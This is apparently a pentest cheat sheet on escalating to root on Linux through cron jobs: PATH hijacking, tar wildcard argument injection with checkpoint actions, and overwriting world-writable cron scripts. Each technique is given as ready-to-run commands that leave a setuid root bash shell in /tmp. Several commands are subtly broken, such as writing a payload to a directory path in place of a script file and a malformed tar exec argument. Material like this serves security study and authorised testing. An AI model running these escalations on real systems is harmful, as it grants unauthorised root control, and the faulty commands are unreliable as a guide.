# Cron Jobs
### Multiple ways of accessing information about cron jobs

https://github.com/RustySoldier/PentestSheet/tree/main/OtherCheatSheets
#### NOTE: for all the following escalation the program should be running as root to escalate to root
## Escalation via Cron paths
If we can access Cron jobs from any of the cmds mentioned in the link above 
and get something like the following
![image](https://user-images.githubusercontent.com/115465242/194920627-82b0d2f4-dee1-4f9c-8682-1d6351e660a1.png)

#### this is a jackpot
The all asterix means that the program is running every minute. Even if dont get all asterix we can still attack through this methodology but will have to wait for that much amount of time.

The program **overwrite.sh** here doesn't have an absolute path mentioned so it will check through each of the '\$PATH' values and then execute wherever it finds overwrite.sh first

We are going to exploit this to our adv.
### NOTE: \$PATH = /firstPath:/secondPath:...
### Commands:
1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/firstPath
2. ls -al /tmp/bash and **WAIT**! (till it gets updated)
3. /tmp/bash -p
4. SHELL ACQUIRED

## Escalation via   Cron WildCards
First get the Cron Jobs List.
If there is no escalation via cron paths possible take a look into the programs itself. 
If a command in the program has wildcards entries **"\*"**, it can be manipulated to elevate shell

### FOR EXAMPLE
In the above picture we have another program that runs every minute: compress.sh; It has a defined path so escalation via Cron Paths isnt possible
If we cat out it's content we have
![image](https://user-images.githubusercontent.com/115465242/194927827-08f03413-6656-4fb4-8fe7-99716948b477.png)
The command **TAR** is taking a wildcard entry.
The program simply goes to **/home/user** and compresses everything present in the directory
NOW MOVING ON TO THE EXPLOITATION 
#### NOTE: THE FOLLOWING COMMANDS ARE TAR SPECIFIC,THEY WON'T WORK FOR OTHER CMDs
### Commands:
 1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/home/user/runme.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\runme.sh
 4. **WAIT**
 5. /tmp/bash -p -> root

So what it does is Tar --checkpoint=1 gives status update/ or does an action every time something is compressed and Tar --checkpoint-action defines what the action is supposed to be. So due to wildcard the above list of command converts to **Tar --checkpoint=1 --checkpoint-action=exec=sh\runme.sh**; Hence giving us a shell with root perms
 
## Escalation via Cron job files overwrite
Get the Cron jobs list
ls -al on the programs to find any writeable file rwx---**rw-** 
Then just use the following command to get a escalated shell
### Command:
1. locate progname
2. ls -al /fullpath/progname
3. If  rwx---**rw-** 
4. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/fullpath/progname
5. **WAIT**
6. SHELL
